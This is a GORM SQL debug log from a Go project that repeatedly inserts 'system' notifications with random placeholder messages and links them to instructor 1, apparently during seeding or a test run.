2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.519ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 79 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[11.312ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.574','2025-06-09 14:07:57.574',NULL,1,79) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.033ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.582','2025-06-09 14:07:57.582',NULL,'wTgsAOcrTmHmwFhqGLwm','system','2025-06-09 14:07:57.582',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.508ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.530ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 80 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[6.888ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.589','2025-06-09 14:07:57.589',NULL,1,80) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.661ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.595','2025-06-09 14:07:57.595',NULL,'bArhKTTFheCFDrDsYlQm','system','2025-06-09 14:07:57.595',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.442ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.570ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 81 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[6.801ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.602','2025-06-09 14:07:57.602',NULL,1,81) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[12.982ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.614','2025-06-09 14:07:57.614',NULL,'IYvwLTZLZWtBZlQuZsuR','system','2025-06-09 14:07:57.613',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.487ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.507ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 82 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[6.733ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.622','2025-06-09 14:07:57.622',NULL,1,82) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.786ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.628','2025-06-09 14:07:57.628',NULL,'ipVLpmdHtReEzyWXjnTf','system','2025-06-09 14:07:57.627',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.488ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.536ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 83 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[8.943ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.635','2025-06-09 14:07:57.635',NULL,1,83) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.952ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.644','2025-06-09 14:07:57.644',NULL,'wASDPCBUlKRsfYgGEsPY','system','2025-06-09 14:07:57.644',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.550ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.574ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 84 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[8.759ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.651','2025-06-09 14:07:57.651',NULL,1,84) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.529ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.658','2025-06-09 14:07:57.658',NULL,'QtUqHeaTtHcuPVkLgOOQ','system','2025-06-09 14:07:57.658',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.170ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.854ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 85 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[27.284ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.668','2025-06-09 14:07:57.668',NULL,1,85) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.313ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.692','2025-06-09 14:07:57.692',NULL,'JLMtUvILMTNGGJgFeQlG','system','2025-06-09 14:07:57.692',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.485ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.550ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 86 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[10.878ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.704','2025-06-09 14:07:57.704',NULL,1,86) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.777ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.711','2025-06-09 14:07:57.711',NULL,'olvxllMtzMPIoqoRgZeT','system','2025-06-09 14:07:57.711',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.541ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.532ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 87 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[11.130ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.722','2025-06-09 14:07:57.722',NULL,1,87) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[10.255ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.73','2025-06-09 14:07:57.73',NULL,'gORqXnsRGsqzLkYBUxUX','system','2025-06-09 14:07:57.73',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.475ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.474ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 88 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[6.810ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.741','2025-06-09 14:07:57.741',NULL,1,88) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.982ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.747','2025-06-09 14:07:57.747',NULL,'zjImCdZiZRBZCTiXxASm','system','2025-06-09 14:07:57.747',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.444ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.672ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 89 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[9.287ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.757','2025-06-09 14:07:57.757',NULL,1,89) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.306ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.763','2025-06-09 14:07:57.763',NULL,'TNMeylPcLMlehnmeieqi','system','2025-06-09 14:07:57.763',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.510ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.504ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 90 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[7.821ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.772','2025-06-09 14:07:57.772',NULL,1,90) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.387ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.778','2025-06-09 14:07:57.778',NULL,'jYjZnnHWghakuhUQHctL','system','2025-06-09 14:07:57.778',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.484ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.595ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 91 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[11.468ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.787','2025-06-09 14:07:57.787',NULL,1,91) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.908ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.797','2025-06-09 14:07:57.797',NULL,'OPmklDIywpwtdeqXeBuc','system','2025-06-09 14:07:57.797',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.889ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.752ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 92 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[9.372ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.805','2025-06-09 14:07:57.805',NULL,1,92) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.134ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.813','2025-06-09 14:07:57.813',NULL,'FwBJAOxvsYxMUbxytugp','system','2025-06-09 14:07:57.813',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.581ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.525ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 93 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[18.002ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.824','2025-06-09 14:07:57.824',NULL,1,93) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.733ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.837','2025-06-09 14:07:57.837',NULL,'ZZwCHooWPgrBXxGwxqAE','system','2025-06-09 14:07:57.837',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.494ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.144ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 94 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[15.106ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.847','2025-06-09 14:07:57.847',NULL,1,94) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.143ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.859','2025-06-09 14:07:57.859',NULL,'WhAgZmFIaFYHKhZVENaz','system','2025-06-09 14:07:57.859',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.512ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.604ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 95 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[9.926ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.867','2025-06-09 14:07:57.867',NULL,1,95) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[9.031ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.184','2025-06-09 14:07:58.184',NULL,'dfWAibZsCimpkoEMymcG','system','2025-06-09 14:07:58.184',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.805ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.584ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 96 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[16.531ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:58.194','2025-06-09 14:07:58.194',NULL,1,96) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[10.138ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.21','2025-06-09 14:07:58.21',NULL,'WNPXDlEXdjjYqECaWDIf','system','2025-06-09 14:07:58.21',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.604ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.552ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 97 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[12.313ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:58.225','2025-06-09 14:07:58.225',NULL,1,97) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[12.564ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.234','2025-06-09 14:07:58.234',NULL,'uSazbqbVwGSuVejvVjtb','system','2025-06-09 14:07:58.233',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.555ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.321ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 98 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[10.708ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:58.25','2025-06-09 14:07:58.25',NULL,1,98) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
